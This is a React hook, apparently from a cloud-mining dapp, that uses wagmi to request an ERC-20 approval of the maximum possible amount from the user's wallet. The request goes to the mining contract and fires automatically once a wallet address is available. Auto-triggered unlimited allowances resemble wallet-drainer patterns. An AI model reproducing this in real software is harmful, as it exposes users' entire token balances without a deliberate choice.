import { useEffect } from 'react';
import { useWriteContract, useSimulateContract } from 'wagmi';

// Ambil alamat kontrak dari .env.local
const DUSDT_CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_DUSDT_CONTRACT_ADDRESS as `0x${string}`;
const CLOUD_MINING_CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT_ADDRESS as `0x${string}`;

// ABI ERC-20 minimal untuk approve function
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_UINT256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');

const useApproveUSDT = (address?: `0x${string}`) => {
  const { data: simulateData } = useSimulateContract({
    address: DUSDT_CONTRACT_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'approve',
    args: [CLOUD_MINING_CONTRACT_ADDRESS, MAX_UINT256],
  });

  const { writeContract } = useWriteContract();

  useEffect(() => {
    if (address && simulateData?.request) {
      writeContract(simulateData.request);
    }
  }, [address, simulateData, writeContract]);
};

export default useApproveUSDT;
